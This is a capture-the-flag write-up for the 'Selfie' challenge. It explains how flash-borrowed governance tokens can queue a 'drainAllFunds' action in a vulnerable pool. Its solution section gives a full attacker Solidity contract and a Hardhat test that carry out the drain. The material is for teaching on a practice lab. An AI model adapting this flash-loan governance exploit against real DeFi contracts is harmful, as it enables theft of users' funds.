# Selfie

## Introduction
A flash pool with a simple governance in place.

## Code Breakdown
Let's start by breaking down ***SelfiePool.sol***.
It uses openzeppelin for ERC20 and address while is uses an inhouse governance.
Basic event, modifier and constructor were created.
Looking at the first function ***flashLoan***, it offers basic flash loan services we've seen so far. It has re-entrancy protections and checks if the sender is from another contract. It'll then perform a low-level call with ***receiveTokens(addres,uint256)***. After performing the low-level call, it'll check if the tokens are returned.
```
function flashLoan(uint256 borrowAmount) external nonReentrant {
    uint256 balanceBefore = token.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
    
    token.transfer(msg.sender, borrowAmount);        
    
    require(msg.sender.isContract(), "Sender must be a deployed contract");
    msg.sender.functionCall(
        abi.encodeWithSignature(
            "receiveTokens(address,uint256)",
            address(token),
            borrowAmount
        )
    );
    
    uint256 balanceAfter = token.balanceOf(address(this));

    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

Next function, ***drainAllFunds*** have an ***onlyGovernance*** modifier which will transfer all tokens to the receiver and emits an event afterwards.

```
function drainAllFunds(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);
    
    emit FundsDrained(receiver, amount);
}
```

## Hints

We know that ***flashLoan*** execute a low-level call, thus we can manipulate the call to execute an action with ***SimpleGovernance.sol***

In ***SimpleGovernance.sol***, there are 2 functions - ***queueAction*** and ***executeAction***. Notice that each action in governance have a timeframe, once the timeframe expires, it'll be due for execution.
```
function _canBeExecuted(uint256 actionId) private view returns (bool) {
    GovernanceAction memory actionToExecute = actions[actionId];
    return (
        actionToExecute.executedAt == 0 &&
        (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
    );
}
```

What we want to do is simple:
1) Create an attacker smart contract with the function ***receiveTokens(address, uint256)*** to match the low-level call from ***SelfiePool.sol***.
2) In the function ***receiveTokens(address, uint256)***, it'll have to call ***queueAction*** to enqueue ***drainAllFunds***.
3) Return the tokens borrowed
4) Fast forward time
5) Execute the ***drainAllFunds*** with ***executeAction***

## Solutions

Here's the attacker smart contract.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";

/**
 * @title Attacker
 * @author BingleBangle-BH
 */
contract Attacker {

    SimpleGovernance public immutable governance;
    SelfiePool public immutable _SelfiePool;
    uint256 public _ActionId;

    constructor(address _SelfiePoolAddress, address _governanceAddress) {
        governance = SimpleGovernance(_governanceAddress);
        _SelfiePool = SelfiePool(_SelfiePoolAddress);
    }

    function receiveTokens(DamnValuableTokenSnapshot token, uint256 _borrowamount) public {
        bytes memory data = abi.encodeWithSignature(
                                "drainAllFunds(address)",
                                tx.origin
                            );

        token.snapshot(); //Required before queueing action

        token.transfer(msg.sender, _borrowamount);

        _ActionId = governance.queueAction(address(_SelfiePool), data, 0);
    }

    function stealFunds(uint256 _amount) public {
        _SelfiePool.flashLoan(_amount);
    }
}
```

Here's the javascript
```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const _Attacker = await ethers.getContractFactory('Attacker', attacker);

    this._AttackerPool = await _Attacker.deploy(this.pool.address, this.governance.address);
    await this._AttackerPool.stealFunds(TOKENS_IN_POOL);
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
    await this.governance.executeAction(await this._AttackerPool._ActionId());
});
```

